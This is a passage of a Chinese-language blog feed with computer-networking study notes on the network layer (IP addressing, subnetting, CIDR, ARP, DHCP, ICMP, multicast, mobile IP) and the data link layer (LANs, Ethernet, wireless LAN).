或TCP），而是直接采用IP</p><p>&emsp;&emsp;BGP是一个外部网关协议，在不同的自治系统之间交换路由信息，由于网络环境复杂，需要保证可靠传输，所 以采用TCP</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/23.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="7-IP组播"><a href="#7-IP组播" class="headerlink" title="7.IP组播"></a>7.IP组播</h4><ul><li><h6 id="IP数据报的三中传输方式"><a href="#IP数据报的三中传输方式" class="headerlink" title="IP数据报的三中传输方式"></a>IP数据报的三中传输方式</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/24.png" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/25.png" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/26.png" style="zoom:80%;" /></center><ul><li><h6 id="IP组播地址"><a href="#IP组播地址" class="headerlink" title="IP组播地址"></a>IP组播地址</h6></li></ul><p>&emsp;&emsp;IP组播地址让源设备能够将分组发送给一组设备。属于多播组的设备将被分配一个组播组IP地址（一群共同需求 主机的相同标识）</p><p>&emsp;&emsp;组播地址范围为224.0.0.0～239.255.255.255（D类地址），一个D类地址表示一个组播组。只能用作分组的目标地 址。源地址总是为单播地址</p><p>&emsp;&emsp;1、组播数据报也是“尽最大努力交付”，不提供可靠交付，应用于UDP</p><p>&emsp;&emsp;2、对组播数据报不产生ICMP差错报文</p><p>&emsp;&emsp;3、并非所有D类地址都可以作为组播地址</p><p>&emsp;</p><h4 id="8-硬件组播"><a href="#8-硬件组播" class="headerlink" title="8.硬件组播"></a>8.硬件组播</h4><p>&emsp;&emsp;同单播地址一样，组播IP地址也需要相应的组播MAC地址在本地网络中实际传送帧。组播MAC地址以十六进制 值01-00-5E打头，余下的6个十六进制位是根据IP组播组地址的最后23位转换得到的</p><p>&emsp;&emsp;TCP/IP    协议使用的以太网多播地址的范围是: </p><p>&emsp;&emsp;&emsp;&emsp;从01-00-5E-00-00-00到01-00-5E-7F-FF-FF</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/27.png" style="zoom:80%;" /></center><ul><li><h6 id="IGMP协议"><a href="#IGMP协议" class="headerlink" title="IGMP协议"></a>IGMP协议</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/28.png" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/29.png" style="zoom:80%;" /></center><ul><li><h6 id="IGMP工作的两个阶段"><a href="#IGMP工作的两个阶段" class="headerlink" title="IGMP工作的两个阶段"></a>IGMP工作的两个阶段</h6></li></ul><p>&emsp;&emsp;——ROUND 1</p><p>&emsp;&emsp;某主机要加入组播组时，该主机向组播组的组播地址发送一个IGMP报文，声明自己要称为该组的成员。 本地组播路由器收到IGMP报文后，要利用组播路由选择协议把这组成员关系发给因特网上的其他组播路由器</p><p>&emsp;&emsp;——ROUND 2</p><p>&emsp;&emsp;本地组播路由器周期性探询本地局域网上的主机，以便知道这些主机是否还是组播组的成员。 只要有一个主机对某个组响应，那么组播路由器就认为这个组是活跃的；如果经过几次探询后没有一个主机响 应，组播路由器就认为本网络上的没有此组播组的主机，因此就不再把这组的成员关系发给其他的组播路由器</p><ul><li><h6 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h6></li></ul><p>&emsp;&emsp;组播路由器知道的成员关系只是所连接的局域网中有无组播组的成员</p><p>&emsp;</p><h4 id="9-组播路由选择协议"><a href="#9-组播路由选择协议" class="headerlink" title="9.组播路由选择协议"></a>9.组播路由选择协议</h4><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/30.png" style="zoom:80%;" /></center><p>&emsp;&emsp;组播路由协议目的是找出以源主机为根节点的组播转发树，构造树可以避免在路由器之间兜圈子，</p><p>&emsp;&emsp;对不同的多播组对应于不同的多播转发树；同一个多播组，对不同的源点也会有不同的多播转发树</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/31.png" style="zoom:80%;" /></center><ul><li><h6 id="组播路由选择协议常使用的三种算法"><a href="#组播路由选择协议常使用的三种算法" class="headerlink" title="组播路由选择协议常使用的三种算法"></a>组播路由选择协议常使用的三种算法</h6></li></ul><p>&emsp;&emsp;1、基于链路状态的路由选择</p><p>&emsp;&emsp;2、基于距离—向量的路由选择</p><p>&emsp;&emsp;3、协议无关的组播（稀疏/密集）</p><p>&emsp;</p><h4 id="10-移动IP"><a href="#10-移动IP" class="headerlink" title="10.移动IP"></a>10.移动IP</h4><ul><li><h6 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h6></li></ul><p>&emsp;&emsp;移动IP技术是移动结点(计算机/服务器等)以固定的网络IP地址，实现跨越不同网段的漫游功能，并保证了 基于网络IP的网络权限在漫游过程中不发生任何改变</p><p>&emsp;&emsp;移动结点：具有永久IP地址的移动设备</p><p>&emsp;&emsp;归属代理（本地代理）：一个移动结点的永久“居所”称为归属网络，在归属网络中代表移动节点执行移 动管理功能的实体叫做归属代理</p><p>&emsp;&emsp;永久地址（归属地址/主地址）：移动站点在归属网络中的原始地址</p><p>&emsp;&emsp;外部代理（外地代理）：在外部网络中帮助移动节点完成移动管理功能的实体称为外部代理</p><p>&emsp;&emsp;转交地址（辅地址）：可以是外部代理的地址或动态配置的一个地址</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/32.png" style="zoom:80%;" /></center><ul><li><h6 id="通信过程"><a href="#通信过程" class="headerlink" title="通信过程"></a>通信过程</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/33.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="11-网络层设备"><a href="#11-网络层设备" class="headerlink" title="11.网络层设备"></a>11.网络层设备</h4><ul><li><h6 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/34.png" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/35.png" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/36.png" style="zoom:80%;" /></center><ul><li><h6 id="路由器与路由转发"><a href="#路由器与路由转发" class="headerlink" title="路由器与路由转发"></a>路由器与路由转发</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/37.png" style="zoom:80%;" /></center><ul><li><h6 id="三层设备的对比"><a href="#三层设备的对比" class="headerlink" title="三层设备的对比"></a>三层设备的对比</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB/38.png" style="zoom:80%;" /></center>]]></content>
    
    
    <categories>
      
      <category>计算机网络学习笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>网络层（上）</title>
    <link href="/2022/12/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%83/"/>
    <url>/2022/12/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%83/</url>
    
    <content type="html"><![CDATA[<h1 id="网络层（上）"><a href="#网络层（上）" class="headerlink" title="网络层（上）"></a>网络层（上）</h1><h4 id="1-网络层基本概念"><a href="#1-网络层基本概念" class="headerlink" title="1.网络层基本概念"></a>1.网络层基本概念</h4><p>&emsp;&emsp;网络层的主要任务是把分组从源端传送到目的端，为分组交换网上的不同主机提供通信服务。网络层传输单位是数据报</p><ul><li><h6 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h6></li></ul><p>&emsp;&emsp;1、路由的选择与分组转发（最佳路径）</p><p>&emsp;&emsp;2、异构网络互联</p><p>&emsp;&emsp;3、拥塞控制（静态手法——开环控制、动态手法——闭环控制）</p><p>&emsp;</p><h4 id="2-IP数据报"><a href="#2-IP数据报" class="headerlink" title="2.IP数据报"></a>2.IP数据报</h4><ul><li><h6 id="TCP-IP协议栈"><a href="#TCP-IP协议栈" class="headerlink" title="TCP/IP协议栈"></a>TCP/IP协议栈</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%83/1.png" style="zoom:80%;" /></center><ul><li><h6 id="IP数据报格式的基本内容"><a href="#IP数据报格式的基本内容" class="headerlink" title="IP数据报格式的基本内容"></a>IP数据报格式的基本内容</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%83/2.png" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%83/3.png" style="zoom:80%;" /></center><ul><li><h6 id="最大传送单元MTU"><a href="#最大传送单元MTU" class="headerlink" title="最大传送单元MTU"></a>最大传送单元MTU</h6></li></ul><p>&emsp;&emsp;链路层数据帧可封装数据的上限，其中以太网的MTU是1500字节</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%83/4.png" style="zoom:80%;" /></center><ul><li><h6 id="IP数据报格式的分片相关内容"><a href="#IP数据报格式的分片相关内容" class="headerlink" title="IP数据报格式的分片相关内容"></a>IP数据报格式的分片相关内容</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%83/5.png" style="zoom:80%;" /></center><ul><li><h6 id="分片举例"><a href="#分片举例" class="headerlink" title="分片举例"></a>分片举例</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%83/6.png" style="zoom:80%;" /></center><p>&emsp;&emsp;在IP数据报中需要注意的是，总长度的基础单位是1B，片偏移基础单位是8B，而首部长度的基础单位是4B</p><p>&emsp;&emsp;</p><h4 id="3-IPv4地址"><a href="#3-IPv4地址" class="headerlink" title="3.IPv4地址"></a>3.IPv4地址</h4><ul><li><h6 id="分类的IP地址"><a href="#分类的IP地址" class="headerlink" title="分类的IP地址"></a>分类的IP地址</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%83/7.png" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%83/8.png" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%83/9.png" style="zoom:80%;" /></center><ul><li><h6 id="特殊的IP地址"><a href="#特殊的IP地址" class="headerlink" title="特殊的IP地址"></a>特殊的IP地址</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%83/10.png" style="zoom:80%;" /></center><ul><li><h6 id="私有IP地址"><a href="#私有IP地址" class="headerlink" title="私有IP地址"></a>私有IP地址</h6></li></ul><table><thead><tr><th align="center">地址类别</th><th align="center">地址范围</th><th align="center">网段个数</th></tr></thead><tbody><tr><td align="center">A类</td><td align="center">10.0.0.0~10.255.255.255</td><td align="center">1</td></tr><tr><td align="center">B类</td><td align="center">172.16.0.0~172.31.255.255</td><td align="center">16</td></tr><tr><td align="center">C类</td><td align="center">192.168.0.0~192.168.255.255</td><td align="center">256</td></tr></tbody></table><p>&emsp;&emsp;路由器对目的地址是私有IP地址的数据报一律不进行转发</p><p>&emsp;</p><h4 id="4-网络地址转换（NAT）"><a href="#4-网络地址转换（NAT）" class="headerlink" title="4.网络地址转换（NAT）"></a>4.网络地址转换（NAT）</h4><p>&emsp;&emsp;网络地址转换NAT：在专用网连接到因特网的路由器上安装NAT软件，安装了NAT软件的路由器叫NAT路由器，它至少有一个有效的外部全球IP地址</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%83/11.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="5-子网"><a href="#5-子网" class="headerlink" title="5.子网"></a>5.子网</h4><ul><li><h6 id="子网划分"><a href="#子网划分" class="headerlink" title="子网划分"></a>子网划分</h6></li></ul><p>&emsp;&emsp;在先前提到的分类的IP地址中，存在两点缺点：</p><p>&emsp;&emsp;1、IP地址空间的利用率有时很低</p><p>&emsp;&emsp;2、两级IP地址不够灵活</p><p>&emsp;&emsp;因此提出了子网划分的概念</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%83/12.png" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%83/13.png" style="zoom:80%;" /></center><ul><li><h6 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%83/14.png" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%83/15.png" style="zoom:80%;" /></center><ul><li><h6 id="必背转换"><a href="#必背转换" class="headerlink" title="必背转换"></a>必背转换</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%83/16.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="6-无分类编址CIDR"><a href="#6-无分类编址CIDR" class="headerlink" title="6.无分类编址CIDR"></a>6.无分类编址CIDR</h4><ul><li><h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%83/17.png" style="zoom:80%;" /></center><ul><li><h6 id="构造超网"><a href="#构造超网" class="headerlink" title="构造超网"></a>构造超网</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%83/18.png" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%83/19.png" style="zoom:80%;" /></center><ul><li><h6 id="最长前缀匹配"><a href="#最长前缀匹配" class="headerlink" title="最长前缀匹配"></a>最长前缀匹配</h6></li></ul><p>&emsp;&emsp;使用CIDR时，查找路由表可能得到几个匹配结果（跟网络掩码按位相与），应选择具有最长网络前缀的路由。 前缀越长，地址块越小，路由越具体。</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%83/20.png" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%83/21.png" style="zoom:80%;" /></center><p>&emsp;&emsp;计算结果得出为B</p><p>&emsp;</p><h4 id="7-ARP协议"><a href="#7-ARP协议" class="headerlink" title="7.ARP协议"></a>7.ARP协议</h4><ul><li><h6 id="发送数据过程"><a href="#发送数据过程" class="headerlink" title="发送数据过程"></a>发送数据过程</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%83/22.png" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%83/23.png" style="zoom:80%;" /></center><ul><li><h6 id="ARP协议内容"><a href="#ARP协议内容" class="headerlink" title="ARP协议内容"></a>ARP协议内容</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%83/24.png" style="zoom:80%;" /></center>&emsp;<h4 id="8-DHCP协议"><a href="#8-DHCP协议" class="headerlink" title="8.DHCP协议"></a>8.DHCP协议</h4><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%83/25.png" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%83/26.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="9-ICMP协议"><a href="#9-ICMP协议" class="headerlink" title="9.ICMP协议"></a>9.ICMP协议</h4><ul><li><h6 id="TCP-IP协议栈-1"><a href="#TCP-IP协议栈-1" class="headerlink" title="TCP/IP协议栈"></a>TCP/IP协议栈</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%83/27.png" style="zoom:80%;" /></center><ul><li><h6 id="网际控制报文协议ICMP"><a href="#网际控制报文协议ICMP" class="headerlink" title="网际控制报文协议ICMP"></a>网际控制报文协议ICMP</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%83/28.png" style="zoom:80%;" /></center><ul><li><h6 id="ICMP的五种差错报告报文"><a href="#ICMP的五种差错报告报文" class="headerlink" title="ICMP的五种差错报告报文"></a>ICMP的五种差错报告报文</h6></li></ul><p>&emsp;&emsp;1、终点不可达：</p><p>&emsp;&emsp;当路由器或主机不能交付数据报时就向源点发送终点不可达报文。（无法交付）</p><p>&emsp;&emsp;2、源点抑制：（已经取消，基本不会用到了）</p><p>&emsp;&emsp;当路由器或主机由于拥塞而丢弃数据报时，就向源点发送源点抑制报文，使源点知道应当把数据 报的发送速率放慢。（拥塞丢数据）</p><p>&emsp;&emsp;3、时间超过：</p><p>&emsp;&emsp;当路由器收到生存时间TTL=0的数据报时，除丢弃该数据报外，还要向源点发送时间超过报文。当 终点在预先规定的时间内不能收到一个数据报的全部数据报片时，就把已收到的数据报片都丢弃，并向源点发 送时间超过报文。（TTL=0）</p><p>&emsp;&emsp;4、参数问题：</p><p>&emsp;&emsp;当路由器或目的主机收到的数据报的首部中有的字段的值不正确时，就丢弃该数据报，并向源点发 送参数问题报文。（首部字段有问题）</p><p>&emsp;&emsp;5、改变路由（重定向）</p><p>&emsp;&emsp;路由器把改变路由报文发送给主机，让主机知道下次应将数据报发送给另外的路由器 （可通过更好的路由）。（值得更好的路由）</p><ul><li><h6 id="ICMP差错报告报文数据字段"><a href="#ICMP差错报告报文数据字段" class="headerlink" title="ICMP差错报告报文数据字段"></a>ICMP差错报告报文数据字段</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%83/29.png" style="zoom:80%;" /></center><ul><li><h6 id="不应发送ICMP差错报文的情况"><a href="#不应发送ICMP差错报文的情况" class="headerlink" title="不应发送ICMP差错报文的情况"></a>不应发送ICMP差错报文的情况</h6></li></ul><p>&emsp;&emsp;1、对ICMP差错报告报文不再发送ICMP差错报告报文</p><p>&emsp;&emsp;2、对第一个分片的数据报片的所有后续数据报片都不发送ICMP差错报告报文</p><p>&emsp;&emsp;3、对具有组播地址的数据报都不发送ICMP差错报告报文（组播是有选择性的，不同于广播的一点到多点）</p><p>&emsp;&emsp;4、对具有特殊地址（如127.0.0.0或0.0.0.0）的数据报不发送ICMP差错报告报文</p><ul><li><h6 id="ICMP询问报文"><a href="#ICMP询问报文" class="headerlink" title="ICMP询问报文"></a>ICMP询问报文</h6></li></ul><p>&emsp;&emsp;1、回送请求和回答报文：（ping）</p><p>主机或路由器向特定目的主机发出的询问，收到此报文的主机必须给源主机或路由 器发送ICMP回送回答报文。（测试目的站是否可达以及了解其相关状态）</p><p>&emsp;&emsp;2、时间戳请求和回答报文：</p><p>&emsp;&emsp;请某个主机或路由器回答当前的日期和时间。（用来进行时钟同步和测量时间）</p><p>&emsp;&emsp;3、掩码地址请求和回答报文：</p><p>&emsp;&emsp;（已经不再使用）</p><p>&emsp;&emsp;4、路由器询问和通告报文：</p><p>&emsp;&emsp;（已经不再使用）</p><ul><li><h6 id="ICMP的应用"><a href="#ICMP的应用" class="headerlink" title="ICMP的应用"></a>ICMP的应用</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%83/30.png" style="zoom:80%;" /></center>]]></content>
    
    
    <categories>
      
      <category>计算机网络学习笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数据链路层（下）</title>
    <link href="/2022/11/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AD/"/>
    <url>/2022/11/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AD/</url>
    
    <content type="html"><![CDATA[<h1 id="数据链路层（下）"><a href="#数据链路层（下）" class="headerlink" title="数据链路层（下）"></a>数据链路层（下）</h1><h4 id="1-局域网"><a href="#1-局域网" class="headerlink" title="1.局域网"></a>1.局域网</h4><ul><li><h6 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h6></li></ul><p>&emsp;&emsp;局域网：简称LAN，是指在某一区域内由多台计算机互联成的计算机组，使用广播信道</p><p>&emsp;&emsp;特点1：覆盖的地理范围较小，只在一个相对独立的局部范围内联，如一座或集中的建筑区内</p><p>&emsp;&emsp;特点2：使用专门铺设的传输介质（双绞线、同轴电缆）进行联网，数据传输速率高（10Mb/s～10Gb/s）</p><p>&emsp;&emsp;特点3：通信延迟时间短，误码率低，可靠性较高</p><p>&emsp;&emsp;特点4：各站为平等关系，共享传输信道</p><p>&emsp;&emsp;特点5：多采用分布式控制和广播式通信，能进行广播和组播</p><p>&emsp;&emsp;决定局域网的主要要素为：网络拓扑，传输介质与介质访问控制方法</p><ul><li><h6 id="局域网拓扑结构"><a href="#局域网拓扑结构" class="headerlink" title="局域网拓扑结构"></a>局域网拓扑结构</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AD/1.png" style="zoom:80%;" /></center><ul><li><h6 id="局域网传输介质"><a href="#局域网传输介质" class="headerlink" title="局域网传输介质"></a>局域网传输介质</h6></li></ul><p>&emsp;&emsp;有线局域网 常用介质：双绞线、同轴电缆、光纤</p><p>&emsp;&emsp;无线局域网 常用介质：电磁波 </p><ul><li><h6 id="局域网介质访问控制方法"><a href="#局域网介质访问控制方法" class="headerlink" title="局域网介质访问控制方法"></a>局域网介质访问控制方法</h6></li></ul><p>&emsp;&emsp;1、CSMA/CD：  常用于总线型局域网，也用于树型网络</p><p>&emsp;&emsp;2、令牌总线：  常用于总线型局域网，也用于树型网络，它是吧总线型或树型网络中的各个工作站按一定顺序如按接口地址大小排列形成一个逻辑环。只有令牌持有者才能控制总线，才有发送信息的权力。</p><p>&emsp;&emsp;3、令牌环：  用于环形局域网，如令牌环网</p><ul><li><h6 id="局域网的分类"><a href="#局域网的分类" class="headerlink" title="局域网的分类"></a>局域网的分类</h6></li></ul><p>&emsp;&emsp;1、以太网：以太网是应用最广泛的局域网，包括标准以太网（10Mbps）、快速以太网（100Mbps）、 千兆以太网（1000 Mbps）和10G以太网，它们都符合IEEE802.3系列标准规范。逻辑拓扑总线 型，物理拓扑是星型或拓展星型。使用CSMA/CD</p><p>&emsp;&emsp;2、令牌环网：物理上采用了星形拓扑结构，逻辑上是环形拓扑结构</p><p>&emsp;&emsp;3、FDDI网：物理上采用了双环拓扑结构，逻辑上是环形拓扑结构</p><p>&emsp;&emsp;4、ATM网：较新型的单元交换技术,使用53字节固定长度的单元进行交换</p><p>&emsp;&emsp;5、无线局域网：采用IEEE 802.11标准</p><ul><li><h6 id="MAC子层和LLC子层"><a href="#MAC子层和LLC子层" class="headerlink" title="MAC子层和LLC子层"></a>MAC子层和LLC子层</h6></li></ul><p>&emsp;&emsp;IEEE 802标准所描述的局域网参考模型只对应OSI参考模型的数据链路层与物理层，它将数据链路层划 分为逻辑链路层LLC子层和介质访问控制MAC子层</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AD/2.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="2-以太网"><a href="#2-以太网" class="headerlink" title="2.以太网"></a>2.以太网</h4><p>&emsp;&emsp;以太网(Ethernet)指的是由Xerox公司创建并由Xerox、Intel和DEC公司联合开发的基带总线局域网规范，是当今 现有局域网采用的最通用的通信协议标准。以太网络使用CSMA/CD（载波监听多路访问及冲突检测）技术</p><ul><li><h6 id="在局域网占统治地位的原因"><a href="#在局域网占统治地位的原因" class="headerlink" title="在局域网占统治地位的原因"></a>在局域网占统治地位的原因</h6></li></ul><p>&emsp;&emsp;1、造价低廉（以太网网卡不到100块）</p><p>&emsp;&emsp;2、是应用最广泛的局域网技术</p><p>&emsp;&emsp;3、比令牌环网、ATM网便宜，简单</p><p>&emsp;&emsp;4、满足网络速率要求：10Mb/s~10Gb/s</p><ul><li><h6 id="两个标准"><a href="#两个标准" class="headerlink" title="两个标准"></a>两个标准</h6></li></ul><p>&emsp;&emsp;DIX Ethernet V2：第一个局域网产品（以太网）规约</p><p>&emsp;&emsp;IEEE 802.3：IEEE 802委员会802.3工作组制定的第一个IEEE的以太网标准</p><ul><li><h6 id="提供的服务特性"><a href="#提供的服务特性" class="headerlink" title="提供的服务特性"></a>提供的服务特性</h6></li></ul><p>&emsp;&emsp;无连接：发送方和接收方之间无“握手过程”</p><p>&emsp;&emsp;不可靠：不对发送方的数据帧编号，接收方不向发送方进行确认，差错帧直接丢弃，差错纠正由高层负责</p><ul><li><h6 id="传输介质与拓扑结构的发展"><a href="#传输介质与拓扑结构的发展" class="headerlink" title="传输介质与拓扑结构的发展"></a>传输介质与拓扑结构的发展</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AD/3.png" style="zoom:80%;" /></center><ul><li><h6 id="10BASE-T以太网"><a href="#10BASE-T以太网" class="headerlink" title="10BASE-T以太网"></a>10BASE-T以太网</h6></li></ul><p>&emsp;&emsp;10BASE-T是传送基带信号的双绞线以太网，T表示采用双绞线，现10BASE-T 采用的是无屏蔽双绞线 （UTP），传输速率是10Mb/s</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AD/4.png" style="zoom:80%;" /></center><ul><li><h6 id="适配器与MAC地址"><a href="#适配器与MAC地址" class="headerlink" title="适配器与MAC地址"></a>适配器与MAC地址</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AD/5.png" style="zoom:80%;" /></center><p>&emsp;&emsp;在局域网中，硬件地址又称为物理地址，或MAC地址。【实际上是标识符】 </p><p>&emsp;&emsp;MAC地址：每个适配器有一个全球唯一的48位二进制地址，前24位代表厂家（由IEEE规定），后24位厂家自己 指定。常用6个十六进制数表示，如02-60-8c-e4-b1-21</p><ul><li><h6 id="MAC帧"><a href="#MAC帧" class="headerlink" title="MAC帧"></a>MAC帧</h6></li></ul><p>&emsp;&emsp;最常用的MAC帧是以太网V2的格式</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AD/6.png" style="zoom:80%;" /></center><ul><li><h6 id="高速以太网"><a href="#高速以太网" class="headerlink" title="高速以太网"></a>高速以太网</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AD/7.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="3-无线局域网"><a href="#3-无线局域网" class="headerlink" title="3.无线局域网"></a>3.无线局域网</h4><p>&emsp;&emsp;IEEE 802.11是无线局域网通用的标准，它是由IEEE所定义的无线网络通信的标准</p><ul><li>MAC帧</li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AD/8.png" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AD/9.png" style="zoom:80%;" /></center><ul><li><h6 id="无限局域网的分类-非重点"><a href="#无限局域网的分类-非重点" class="headerlink" title="无限局域网的分类(非重点)"></a>无限局域网的分类(非重点)</h6></li></ul><p>&emsp;&emsp;1、有固定基础设施无线局域网：</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AD/10.png" style="zoom:80%;" /></center><p>&emsp;&emsp;2、无固定基础设施无线局域网的自组织网络</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AD/11.png" style="zoom:80%;" 